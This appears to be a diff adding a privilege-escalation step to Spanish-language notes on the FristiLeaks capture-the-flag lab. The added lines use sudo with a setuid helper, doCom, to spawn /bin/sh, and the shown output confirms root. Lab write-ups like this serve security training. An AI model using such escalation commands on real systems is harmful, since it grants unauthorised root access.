@@ -145,4 +145,6 @@ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom cat /root/fristileaks_se
 Flag: Y0u_kn0w_y0u_l0ve_fr1st1
 
 Elevación privs
-
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/sh
+id
+  uid=0(root) gid=100(users) groups=100(users),502(fristigod)
